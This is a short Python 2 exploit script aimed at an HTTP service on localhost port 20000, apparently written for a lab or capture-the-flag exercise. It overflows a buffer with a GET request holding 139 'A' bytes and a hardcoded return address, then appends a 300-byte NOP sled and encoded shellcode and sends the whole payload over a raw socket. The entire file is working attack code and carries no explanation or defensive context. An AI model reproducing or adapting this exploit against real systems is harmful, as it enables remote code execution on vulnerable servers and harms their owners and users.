import socket
import sys

def send_payload(payload):
  # Create a TCP/IP socket
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  # Connect the socket to the port where the server is listening
  server_address = ('localhost', 20000)
  print >>sys.stderr, 'connecting to %s port %s' % server_address
  sock.connect(server_address)

  try:
      # Send data
      message = payload
      print >>sys.stderr, 'sending "%s"' % message
      sock.sendall(message)


      data = sock.recv(4090)
      print >>sys.stderr, 'received "%s"' % data

  finally:
      print >>sys.stderr, 'closing socket'
      sock.close()

base_address = b"\xbf\xb5\x57\x78"
eip_overwrite = b"\xBF\xB5\x58\xA8"[::-1]


mode = 'GET'
path = 139*'A' + eip_overwrite
protocol = 'HTTP/1.1'
nopsled = b"\x90" * 300

shellcode =  b""
shellcode += b"\xbf\xc2\x14\x5e\x38\xdb\xc6\xd9\x74\x24\xf4\x58\x29"
shellcode += b"\xc9\xb1\x12\x83\xe8\xfc\x31\x78\x0e\x03\xba\x1a\xbc"
shellcode += b"\xcd\x0b\xf8\xb7\xcd\x38\xbd\x64\x78\xbc\xc8\x6a\xcc"
shellcode += b"\xa6\x07\xec\xbe\x7f\x28\xd2\x0d\xff\x01\x54\x77\x97"
shellcode += b"\x51\x0e\xac\x3a\x3a\x4d\xb3\xdb\xfa\xd8\x52\x53\x9c"
shellcode += b"\x8a\xc5\xc0\xd2\x28\x6f\x07\xd9\xaf\x3d\xaf\x8c\x80"
shellcode += b"\xb2\x47\x39\xf0\x1b\xf5\xd0\x87\x87\xab\x71\x11\xa6"
shellcode += b"\xfb\x7d\xec\xa9"

payload = '{} {} {}'.format(mode, path, protocol)
payload += nopsled 
payload += shellcode
send_payload(payload)
